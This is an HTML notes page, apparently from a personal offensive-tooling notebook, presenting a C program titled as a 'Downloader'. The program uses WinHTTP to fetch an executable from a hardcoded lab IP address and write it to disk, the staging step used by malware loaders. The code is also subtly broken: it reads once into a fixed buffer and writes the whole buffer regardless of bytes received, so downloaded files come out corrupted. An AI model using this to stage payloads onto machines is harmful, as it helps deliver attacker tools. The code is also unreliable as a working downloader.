<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WinHTTP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Downloader - WinHTTP</h1></strong><br /><a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview">https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview</a><br /><br />WinHTTP wraps WinInet up a little easier.<br />Or not? I don&#39;t really know. Might just be newer WinInet.<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winhttp.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Winhttp.lib&quot;)<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;bRet&nbsp;=&nbsp;FALSE;<br />	<br />	wchar_t&nbsp;user_agent[]&nbsp;=&nbsp;L&quot;hey&nbsp;:)&quot;;<br />	wchar_t&nbsp;ip[]&nbsp;=&nbsp;L&quot;192.168.58.142&quot;;<br />	wchar_t&nbsp;target_file[]&nbsp;=&nbsp;L&quot;whoami.exe&quot;;<br /><br />	//&nbsp;initialise&nbsp;WinHTTP<br />	HINTERNET&nbsp;hSession&nbsp;=&nbsp;NULL;<br />	hSession&nbsp;=&nbsp;WinHttpOpen(user_agent,&nbsp;WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,&nbsp;WINHTTP_NO_PROXY_NAME,&nbsp;WINHTTP_NO_PROXY_BYPASS,&nbsp;0);<br />	if&nbsp;(hSession&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;initialise&nbsp;WinHTTP:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;WinHTTP&nbsp;initialised&nbsp;\n&quot;);<br /><br />	//&nbsp;connect&nbsp;to&nbsp;server<br />	HINTERNET&nbsp;hConnect&nbsp;=&nbsp;NULL;<br />	hConnect&nbsp;=&nbsp;WinHttpConnect(hSession,&nbsp;ip,&nbsp;INTERNET_DEFAULT_HTTP_PORT,&nbsp;0);<br />	if&nbsp;(hConnect&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;server:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;connected&nbsp;to&nbsp;server&nbsp;\n&quot;);<br /><br />	//&nbsp;create&nbsp;HTTP&nbsp;request<br />	HINTERNET&nbsp;hRequest&nbsp;=&nbsp;NULL;<br />	hRequest&nbsp;=&nbsp;WinHttpOpenRequest(hConnect,&nbsp;L&quot;GET&quot;,&nbsp;target_file,&nbsp;NULL,&nbsp;WINHTTP_NO_REFERER,&nbsp;WINHTTP_DEFAULT_ACCEPT_TYPES,&nbsp;0);<br />	if&nbsp;(hRequest&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;HTTP&nbsp;request:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;HTTP&nbsp;request&nbsp;created&nbsp;\n&quot;);<br /><br />	//&nbsp;send&nbsp;request<br />	bRet&nbsp;=&nbsp;WinHttpSendRequest(hRequest,&nbsp;WINHTTP_NO_ADDITIONAL_HEADERS,&nbsp;0,&nbsp;WINHTTP_NO_REQUEST_DATA,&nbsp;0,&nbsp;0,&nbsp;0);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;send&nbsp;HTTP&nbsp;request:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;HTTP&nbsp;request&nbsp;sent&nbsp;\n&quot;);<br /><br />	//&nbsp;receive&nbsp;response<br />	bRet&nbsp;=&nbsp;WinHttpReceiveResponse(hRequest,&nbsp;NULL);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;receive&nbsp;HTTP&nbsp;response:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;HTTP&nbsp;response&nbsp;received&nbsp;\n&quot;);<br /><br />	//&nbsp;download&nbsp;file<br />	char&nbsp;file_buffer[66560];<br />	DWORD&nbsp;dwBytesRead&nbsp;=&nbsp;0;<br />	bRet&nbsp;=&nbsp;WinHttpReadData(hRequest,&nbsp;&amp;file_buffer,&nbsp;sizeof(file_buffer),&nbsp;&amp;dwBytesRead);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;download&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;file&nbsp;downloaded&nbsp;\n&quot;);<br /><br />	HANDLE&nbsp;hFile&nbsp;=&nbsp;CreateFileW(L&quot;whoami.exe&quot;,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(hFile,&nbsp;&amp;file_buffer,&nbsp;sizeof(file_buffer),&nbsp;NULL,&nbsp;NULL);<br />	CloseHandle(hFile);<br /><br />	WinHttpCloseHandle(hSession);<br />	WinHttpCloseHandle(hConnect);<br />	WinHttpCloseHandle(hRequest);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /></div>
</body>
</html>
